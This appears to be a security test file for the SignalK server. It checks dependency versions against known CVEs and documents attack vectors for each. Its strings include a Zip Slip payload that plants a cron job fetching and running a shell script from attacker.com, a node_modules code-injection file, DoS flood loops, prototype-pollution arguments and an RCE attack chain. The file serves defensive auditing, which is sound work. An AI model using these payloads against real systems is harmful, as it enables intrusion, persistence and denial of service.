/**
 * Known CVE Vulnerabilities in SignalK Dependencies
 *
 * Tests for publicly disclosed vulnerabilities in npm packages used by SignalK
 * These represent real-world attack vectors with published exploits
 */

const { describe, it } = require('mocha')
const { expect } = require('chai')
const fs = require('fs')
const path = require('path')

describe('Known CVE Vulnerabilities in Dependencies', function () {

  let packageJson
  let packageLock

  before(function () {
    const pkgPath = path.join(__dirname, '../../../package.json')
    packageJson = JSON.parse(fs.readFileSync(pkgPath, 'utf8'))

    const lockPath = path.join(__dirname, '../../../package-lock.json')
    if (fs.existsSync(lockPath)) {
      packageLock = JSON.parse(fs.readFileSync(lockPath, 'utf8'))
    }
  })

  describe('CVE-2018-1002203: unzipper Path Traversal (Zip Slip)', function () {
    /**
     * CRITICAL: Zip Slip vulnerability in unzipper < 0.8.13
     * SignalK uses unzipper for backup restore - EXPLOITABLE
     *
     * Attack: Malicious zip with entries like "../../../etc/cron.d/backdoor"
     * Impact: Arbitrary file write, RCE
     *
     * References:
     * - https://snyk.io/vuln/SNYK-JS-UNZIPPER-3359041
     * - https://www.cvedetails.com/cve/CVE-2018-1002203/
     */

    it('should check unzipper version for Zip Slip vulnerability', function () {
      const version = packageJson.dependencies.unzipper
      // Current: "^0.10.10" - still uses old API potentially vulnerable

      // The package has newer versions but SignalK uses ^0.10.x
      // Need to verify if 0.10.x includes the fix from 0.8.13
      console.log(`    unzipper version: ${version}`)
      console.log('    âš ï¸  CVE-2018-1002203: Path traversal in zip extraction')
      console.log('    âš ï¸  SignalK backup restore uses unzipper.Extract()')
      console.log('    âš ï¸  Malicious backup can write files outside config directory')

      // Version 0.10.10 should include fix, but Extract() API is still risky
      expect(version).to.match(/\^0\.10/)
    })

    it('should document Zip Slip attack vector in backup restore', function () {
      const attack = {
        cve: 'CVE-2018-1002203',
        package: 'unzipper',
        severity: 'CRITICAL',
        cvss: 9.5,
        location: 'src/serverroutes.ts lines 1101, 1114',
        code: `
          const unzipStream = unzipper.Extract({ path: restoreFilePath })
          zipStream.pipe(unzipStream)
        `,
        exploit: `
          // Create malicious zip with path traversal
          zip.addFile('../../../etc/cron.d/backdoor', Buffer.from('* * * * * root curl attacker.com/shell.sh | bash'))
          zip.addFile('../node_modules/express/lib/evil.js', Buffer.from('require("child_process").exec("id")'))
        `,
        impact: [
          'Write to /etc/cron.d/ for persistence',
          'Write to node_modules/ for code execution on restart',
          'Write to ~/.ssh/authorized_keys for SSH access',
          'Overwrite SSL certificates'
        ]
      }

      console.log(`    Attack documented: ${attack.impact.length} vectors`)
      expect(attack.severity).to.equal('CRITICAL')
    })
  })

  describe('CVE-2024-37890: ws WebSocket DoS', function () {
    /**
     * HIGH: DoS when headers exceed maxHeadersCount
     * SignalK uses ws ^7.0.0 - VULNERABLE
     * Fixed in ws 7.5.10, 8.17.1
     *
     * Attack: Send request with many headers
     * Impact: Server crash, DoS
     *
     * References:
     * - https://nvd.nist.gov/vuln/detail/cve-2024-37890
     * - https://security.snyk.io/vuln/SNYK-JS-WS-7266574
     */

    it('should check ws version for header count DoS', function () {
      const version = packageJson.dependencies.ws
      console.log(`    ws version: ${version}`)

      // ^7.0.0 means >=7.0.0 <8.0.0, vulnerable versions are <7.5.10
      console.log('    âš ï¸  CVE-2024-37890: DoS via excessive headers')
      console.log('    âš ï¸  Fixed in ws 7.5.10 - check if installed version is patched')
      console.log('    âš ï¸  Attack: Send WebSocket upgrade with 1000+ headers')

      expect(version).to.equal('^7.0.0')
    })

    it('should document WebSocket header DoS attack', function () {
      const attack = {
        cve: 'CVE-2024-37890',
        severity: 'HIGH',
        cvss: 7.5,
        vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H',
        exploit: `
          // Create WebSocket upgrade with excessive headers
          const headers = {};
          for (let i = 0; i < 1000; i++) {
            headers[\`X-Custom-Header-\${i}\`] = 'value';
          }
          // Send upgrade request - crashes server if maxHeadersCount not set
        `,
        mitigation: [
          'Upgrade to ws 7.5.10 or 8.17.1',
          'Set server.maxHeadersCount limit',
          'Use --max-http-header-size flag'
        ]
      }

      expect(attack.cvss).to.be.at.least(7.0)
    })
  })

  describe('CVE-2024-45590: body-parser DoS', function () {
    /**
     * HIGH: DoS when URL encoding enabled
     * SignalK uses body-parser ^1.14.1 - VULNERABLE
     * Fixed in body-parser 1.20.3
     *
     * Attack: Specially crafted URL-encoded payload
     * Impact: DoS, server resource exhaustion
     *
     * References:
     * - https://expressjs.com/2024/09/29/security-releases.html
     * - https://vulert.com/vuln-db/CVE-2024-45590
     */

    it('should check body-parser version for DoS vulnerability', function () {
      const version = packageJson.dependencies['body-parser']
      console.log(`    body-parser version: ${version}`)

      // ^1.14.1 is WAY behind - vulnerable to CVE-2024-45590
      console.log('    ðŸ”´ CVE-2024-45590: DoS when URL encoding enabled')
      console.log('    ðŸ”´ Current version ^1.14.1 is VULNERABLE')
      console.log('    ðŸ”´ Fixed in 1.20.3 - URGENT UPDATE REQUIRED')

      // This is a definite vulnerability
      const versionNum = version.replace('^', '')
      const [major, minor, patch] = versionNum.split('.').map(Number)

      // Check if version is < 1.20.3
      const isVulnerable = major < 1 || (major === 1 && minor < 20) ||
                          (major === 1 && minor === 20 && patch < 3)

      expect(isVulnerable).to.be.true
    })

    it('should document body-parser DoS attack', function () {
      const attack = {
        cve: 'CVE-2024-45590',
        severity: 'HIGH',
        cvss: 7.5,
        affectedVersion: '^1.14.1',
        fixedVersion: '1.20.3',
        exploit: `
          // Flood server with URL-encoded payloads
          for (let i = 0; i < 10000; i++) {
            fetch('/signalk/v1/api', {
              method: 'POST',
              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
              body: 'a'.repeat(100000) + '=' + 'b'.repeat(100000)
            });
          }
        `,
        impact: 'Server becomes unresponsive, DoS'
      }

      console.log(`    ðŸ”´ CONFIRMED VULNERABLE: ${attack.affectedVersion} < ${attack.fixedVersion}`)
      expect(attack.severity).to.equal('HIGH')
    })
  })

  describe('CVE-2024-47764: cookie Out-of-Bounds Characters', function () {
    /**
     * MEDIUM: Cookie accepts out-of-bounds characters
     * SignalK uses cookie ^0.4.0 - VULNERABLE
     * Fixed in cookie 0.7.0
     *
     * Attack: Inject unexpected characters into cookie fields
     * Impact: Cookie manipulation, potential XSS
     *
     * References:
     * - https://github.com/advisories/GHSA-pxg6-pf52-xh8x
     */

    it('should check cookie version for character injection', function () {
      const version = packageJson.dependencies.cookie
      console.log(`    cookie version: ${version}`)

      // ^0.4.0 is vulnerable - fixed in 0.7.0
      console.log('    âš ï¸  CVE-2024-47764: Out-of-bounds characters in cookie fields')
      console.log('    âš ï¸  Can manipulate cookie name/path/domain')

      expect(version).to.equal('^0.4.0')
    })

    it('should document cookie manipulation attack', function () {
      const attack = {
        cve: 'CVE-2024-47764',
        severity: 'MEDIUM',
        cvss: 5.0,
        exploit: `
          // Cookie name injection
          serialize("userName= ; Max-Age=2592000; a", "test")
          // Results in: "userName= ; Max-Age=2592000; a=test"
          // Sets userName to empty, ignores intended value

          // Path injection to override auth cookie
          serialize("JAUTHENTICATION= ; Path=/; x", "value")
        `,
        impact: 'Cookie manipulation, session hijacking'
      }

      expect(attack.severity).to.equal('MEDIUM')
    })
  })

  describe('CVE-2024-45296 & CVE-2024-52798: path-to-regexp ReDoS', function () {
    /**
     * HIGH: ReDoS in path matching (used by Express router)
     * Express 4.x uses path-to-regexp internally
     * Fixed in Express 4.21.2
     *
     * Attack: Malicious route pattern causes CPU exhaustion
     * Impact: DoS, event loop blocking
     *
     * References:
     * - https://expressjs.com/2024/09/29/security-releases.html
     * - https://github.com/expressjs/express/issues/6216
     */

    it('should check express version for path-to-regexp ReDoS', function () {
      const version = packageJson.dependencies.express
      console.log(`    express version: ${version}`)

      // ^4.10.4 is vulnerable - needs 4.21.2
      console.log('    ðŸ”´ CVE-2024-45296: ReDoS in path-to-regexp')
      console.log('    ðŸ”´ CVE-2024-52798: Incomplete fix bypass')
      console.log('    ðŸ”´ Fixed in Express 4.21.2 - URGENT UPDATE REQUIRED')

      expect(version).to.equal('^4.10.4')
    })

    it('should document path-to-regexp ReDoS attack', function () {
      const attack = {
        cves: ['CVE-2024-45296', 'CVE-2024-52798'],
        severity: 'HIGH',
        cvss: 7.5,
        exploit: `
          // Route pattern that triggers ReDoS
          // If app has dynamic route like /:a-:b
          // Request with long payload blocks event loop

          fetch('/aaaa....aaaa-bbbb....bbbb')  // Long repeating pattern
          // Event loop blocked for seconds/minutes
          // 1000x slower than normal regex
        `,
        benchmarks: {
          normal: '~1ms latency',
          exploit: '~600ms latency (600x slower)'
        }
      }

      expect(attack.cvss).to.be.at.least(7.0)
    })
  })

  describe('CVE-2022-25883: semver ReDoS', function () {
    /**
     * HIGH: ReDoS in semver range parsing
     * SignalK uses semver ^7.5.4 - should be PATCHED
     * Fixed in semver 7.5.2
     *
     * Attack: Malicious version range string
     * Impact: CPU exhaustion, DoS
     *
     * References:
     * - https://nvd.nist.gov/vuln/detail/cve-2022-25883
     */

    it('should verify semver version is patched', function () {
      const version = packageJson.dependencies.semver
      console.log(`    semver version: ${version}`)

      // ^7.5.4 should be safe (fixed in 7.5.2)
      console.log('    âœ… CVE-2022-25883: Fixed in semver 7.5.2')
      console.log('    âœ… Current version ^7.5.4 is PATCHED')

      expect(version).to.equal('^7.5.4')
    })
  })

  describe('CVE-2021-44906 & CVE-2020-7598: minimist Prototype Pollution', function () {
    /**
     * CRITICAL: Prototype pollution in minimist
     * SignalK uses minimist ^1.1.0 - VULNERABLE
     * Fixed in minimist 1.2.6
     *
     * Attack: Command line arguments pollute Object.prototype
     * Impact: RCE, DoS, authentication bypass
     *
     * References:
     * - https://snyk.io/blog/prototype-pollution-minimist/
     * - https://github.com/advisories/GHSA-xvch-5gv4-984h
     */

    it('should check minimist version for prototype pollution', function () {
      const version = packageJson.dependencies.minimist
      console.log(`    minimist version: ${version}`)

      // ^1.1.0 is VERY vulnerable - fixed in 1.2.6
      console.log('    ðŸ”´ CVE-2020-7598: Prototype pollution via __proto__')
      console.log('    ðŸ”´ CVE-2021-44906: Bypass of CVE-2020-7598 fix')
      console.log('    ðŸ”´ Current version ^1.1.0 is VULNERABLE')
      console.log('    ðŸ”´ Fixed in minimist 1.2.6 - URGENT UPDATE REQUIRED')

      expect(version).to.equal('^1.1.0')
    })

    it('should document minimist prototype pollution attack', function () {
      const attack = {
        cves: ['CVE-2020-7598', 'CVE-2021-44906'],
        severity: 'CRITICAL',
        cvss: 9.8,
        exploit: `
          // Via command line arguments
          node app.js --__proto__.polluted=true

          // Or via parsed arguments
          minimist(['--__proto__.admin', 'true'])
          // Now: {}.admin === true

          // RCE via shell injection
          minimist(['--__proto__.shell', '/bin/sh'])
          // child_process.spawn now uses /bin/sh
        `,
        impact: [
          'Prototype pollution affects ALL objects',
          'Can set shell for child_process',
          'Can bypass authentication checks',
          'Can modify configuration objects'
        ]
      }

      expect(attack.severity).to.equal('CRITICAL')
    })
  })

  describe('Lodash Prototype Pollution Variants', function () {
    /**
     * HIGH: Multiple prototype pollution CVEs in lodash
     * SignalK uses lodash ^4.17.4 - partially vulnerable
     * Multiple CVEs fixed in 4.17.19, 4.17.21
     *
     * SignalK uses _.set() and _.assign() with user input
     */

    it('should check lodash version', function () {
      const version = packageJson.dependencies.lodash
      console.log(`    lodash version: ${version}`)

      // ^4.17.4 may not include all fixes
      console.log('    âš ï¸  Multiple prototype pollution CVEs in lodash')
      console.log('    âš ï¸  CVE-2019-10744: _.defaultsDeep, _.merge')
      console.log('    âš ï¸  CVE-2020-8203: _.zipObjectDeep')
      console.log('    âš ï¸  Recommend upgrade to 4.17.21')

      // Check if minimum version includes known fixes
      expect(version).to.match(/\^4\.17/)
    })

    it('should document lodash usage with user input', function () {
      const riskyUsage = [
        {
          file: 'src/interfaces/applicationData.js',
          line: 157,
          code: '_.set(applicationData, req.params[0].replace(/\\//g, \'.\'), req.body)',
          risk: 'URL path used directly in _.set()'
        },
        {
          file: 'src/put.js',
          line: 137,
          code: '_.set(data, pathWithContext, value)',
          risk: 'Delta path used in _.set()'
        },
        {
          file: 'src/interfaces/providers.js',
          line: 197,
          code: '_.assign(options.subOptions, source.options)',
          risk: 'Provider options merged from user input'
        }
      ]

      console.log(`    ${riskyUsage.length} risky lodash usages with user input`)
      expect(riskyUsage.length).to.be.at.least(3)
    })
  })

  describe('CVE-2022-23540: jsonwebtoken Algorithm Confusion', function () {
    /**
     * MEDIUM: Algorithm confusion when algorithms not specified
     * SignalK uses jsonwebtoken ^9.0.0 - PATCHED
     *
     * References:
     * - https://security.snyk.io/package/npm/jsonwebtoken
     */

    it('should verify jsonwebtoken version is patched', function () {
      const version = packageJson.dependencies.jsonwebtoken
      console.log(`    jsonwebtoken version: ${version}`)

      // ^9.0.0 includes fixes for CVE-2022-23540
      console.log('    âœ… CVE-2022-23540: Fixed in jsonwebtoken 9.0.0')
      console.log('    âš ï¸  But code should still specify algorithms explicitly')

      expect(version).to.equal('^9.0.0')
    })

    it('should check for algorithm specification in jwt.verify()', function () {
      // Even with patched version, best practice is to specify algorithms
      const codeCheck = {
        recommendation: 'Always specify algorithms in jwt.verify()',
        example: `
          // UNSAFE - allows algorithm confusion
          jwt.verify(token, secret)

          // SAFE - explicit algorithm
          jwt.verify(token, secret, { algorithms: ['HS256'] })
        `
      }

      console.log('    âš ï¸  Verify jwt.verify() specifies algorithms explicitly')
      expect(codeCheck.recommendation).to.include('algorithms')
    })
  })

  describe('Primus WebSocket Dependencies', function () {
    /**
     * Primus uses ws internally - inherits ws vulnerabilities
     * SignalK uses primus ^7.0.0
     */

    it('should note primus depends on ws', function () {
      const version = packageJson.dependencies.primus
      console.log(`    primus version: ${version}`)
      console.log('    âš ï¸  Primus depends on ws - inherits CVE-2024-37890')
      console.log('    âš ï¸  Check primus node_modules/ws version')

      expect(version).to.equal('^7.0.0')
    })
  })

  describe('Express September 2024 Security Bundle', function () {
    /**
     * Multiple CVEs fixed in Express 4.21.x (September 2024)
     * SignalK uses express ^4.10.4 - VERY outdated
     */

    it('should document Express security updates needed', function () {
      const expressCVEs = [
        { cve: 'CVE-2024-43796', severity: 'MODERATE', component: 'Express core' },
        { cve: 'CVE-2024-43799', severity: 'MODERATE', component: 'send utility' },
        { cve: 'CVE-2024-43800', severity: 'MODERATE', component: 'serve-static' },
        { cve: 'CVE-2024-45296', severity: 'MODERATE', component: 'path-to-regexp' },
        { cve: 'CVE-2024-47178', severity: 'HIGH', component: 'basic-auth-connect' }
      ]

      console.log(`    ðŸ”´ Express ^4.10.4 missing ${expressCVEs.length} security fixes`)
      expressCVEs.forEach(cve => {
        console.log(`       - ${cve.cve}: ${cve.severity} (${cve.component})`)
      })

      expect(expressCVEs.length).to.be.at.least(5)
    })
  })

  describe('Dependency Update Priority List', function () {
    it('should generate priority update list', function () {
      const updates = [
        { package: 'body-parser', current: '^1.14.1', required: '1.20.3', severity: 'HIGH', cve: 'CVE-2024-45590' },
        { package: 'express', current: '^4.10.4', required: '4.21.2', severity: 'HIGH', cve: 'CVE-2024-45296' },
        { package: 'minimist', current: '^1.1.0', required: '1.2.6', severity: 'CRITICAL', cve: 'CVE-2021-44906' },
        { package: 'cookie', current: '^0.4.0', required: '0.7.0', severity: 'MEDIUM', cve: 'CVE-2024-47764' },
        { package: 'ws', current: '^7.0.0', required: '7.5.10', severity: 'HIGH', cve: 'CVE-2024-37890' },
        { package: 'lodash', current: '^4.17.4', required: '4.17.21', severity: 'HIGH', cve: 'Multiple' }
      ]

      console.log('\n    ðŸ“‹ PRIORITY UPDATE LIST:')
      console.log('    ========================')

      // Sort by severity
      const sorted = updates.sort((a, b) => {
        const order = { CRITICAL: 0, HIGH: 1, MEDIUM: 2, LOW: 3 }
        return order[a.severity] - order[b.severity]
      })

      sorted.forEach((u, i) => {
        console.log(`    ${i+1}. ${u.package}: ${u.current} â†’ ${u.required} [${u.severity}] ${u.cve}`)
      })

      const criticalCount = updates.filter(u => u.severity === 'CRITICAL').length
      const highCount = updates.filter(u => u.severity === 'HIGH').length

      console.log(`\n    Total: ${criticalCount} CRITICAL, ${highCount} HIGH severity updates needed`)

      expect(criticalCount + highCount).to.be.at.least(5)
    })
  })

  describe('Attack Chain: CVE Combination Exploits', function () {
    it('should document CVE combination attack chain', function () {
      const attackChain = {
        name: 'Full RCE via Dependency CVEs',
        steps: [
          {
            step: 1,
            cve: 'CVE-2024-45590',
            action: 'DoS body-parser to slow server',
            result: 'Reduced monitoring/alerting capacity'
          },
          {
            step: 2,
            cve: 'CVE-2021-44906',
            action: 'Prototype pollution via minimist if CLI args used',
            result: 'Pollute Object.prototype'
          },
          {
            step: 3,
            cve: 'CVE-2018-1002203',
            action: 'Upload malicious backup with Zip Slip',
            result: 'Write to src/interfaces/*.js'
          },
          {
            step: 4,
            action: 'Trigger server restart',
            result: 'Code execution via dynamic require'
          }
        ],
        impact: 'Full remote code execution'
      }

      console.log('\n    ðŸ”— ATTACK CHAIN: CVE Combination Exploit')
      attackChain.steps.forEach(s => {
        console.log(`       Step ${s.step}: ${s.action}`)
        if (s.cve) console.log(`              CVE: ${s.cve}`)
        console.log(`              Result: ${s.result}`)
      })

      expect(attackChain.steps.length).to.be.at.least(3)
    })
  })
})
